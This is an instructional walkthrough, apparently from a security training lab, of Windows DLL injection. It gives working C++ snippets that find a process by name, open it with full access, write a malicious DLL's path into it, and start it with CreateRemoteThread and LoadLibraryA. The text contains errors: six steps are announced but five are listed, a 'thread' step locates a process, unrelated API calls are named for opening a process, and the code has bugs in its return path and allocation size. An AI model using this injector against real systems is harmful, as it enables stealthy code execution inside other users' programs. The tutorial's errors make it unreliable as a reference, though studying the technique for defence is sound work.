# DLL Injection: A High-Level Overview

DLL injection can be broken down into six steps:

1. Locate a target process to inject.
2. Open the target process.
3. Allocate memory region for the malicious DLL.
4. Write the malicious DLL to the allocated memory.
5. Load and execute the malicious DLL.

We will break down a basic DLL injector to identify each of the steps and explain them in more depth below.

## Step 1: Locate a Target Thread

At the first step of DLL injection, we must locate a target thread. A thread can be located from a process using a trio of Windows API calls: `CreateToolhelp32Snapshot()`, `Process32First()`, and `Process32Next()`.

```cpp
DWORD getProcessId(const char *processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, // Include all processes residing on the system
        0 // Indicates the current process
    );
    if (hSnapshot) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (!strcmp(entry.szExeFile, processName)) {
                    return entry.th32ProcessID; // Process ID of matched process
                }
            } while (Process32Next(hSnapshot, &entry));
        }
    }
}
```

```cpp
DWORD processId = getProcessId(processName); // Stores the enumerated process ID
```

## Step 2: Open the Target Process

After the PID has been enumerated, we need to open the process. This can be accomplished using Windows API calls such as `GetModuleHandle`, `GetProcAddress`, or `OpenProcess`.

```cpp
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS, // Requests all possible access rights
    FALSE, // Child processes do not inherit parent process handle
    processId // Stored process ID
);
```

## Step 3: Allocate Memory for the Malicious DLL

Memory must be allocated for the malicious DLL to reside. This can be accomplished using `VirtualAllocEx`.

```cpp
LPVOID dllAllocatedMemory = VirtualAllocEx(
    hProcess, // Handle for the target process
    NULL, 
    strlen(dllLibFullPath), // Size of the DLL path
    MEM_RESERVE | MEM_COMMIT, // Reserves and commits pages
    PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the committed pages
);
```

## Step 4: Write the Malicious DLL to Allocated Memory

We need to write the malicious DLL to the allocated memory location. This can be done using `WriteProcessMemory`.

```cpp
WriteProcessMemory(
    hProcess, // Handle for the target process
    dllAllocatedMemory, // Allocated memory region
    dllLibFullPath, // Path to the malicious DLL
    strlen(dllLibFullPath) + 1, // Byte size of the malicious DLL
    NULL
);
```

## Step 5: Load and Execute the Malicious DLL

Once the malicious DLL is written to memory, we need to load and execute it. To load the DLL, we use `LoadLibrary` (imported from `kernel32`). Once loaded, `CreateRemoteThread` can be used to execute memory using `LoadLibrary` as the starting function.

```cpp
LPVOID loadLibrary = (LPVOID) GetProcAddress(
    GetModuleHandle("kernel32.dll"), // Handle of the module containing the call
    "LoadLibraryA" // API call to import
);
HANDLE remoteThreadHandler = CreateRemoteThread(
    hProcess, // Handle for the target process
    NULL, 
    0, // Default size from the executable of the stack
    (LPTHREAD_START_ROUTINE) loadLibrary, // Pointer to the starting function
    dllAllocatedMemory, // Pointer to the allocated memory region
    0, // Runs immediately after creation
    NULL
);
```

## Putting It All Together

We can compile these steps together to create a DLL injector. Use the provided C++ injector and experiment with DLL injection.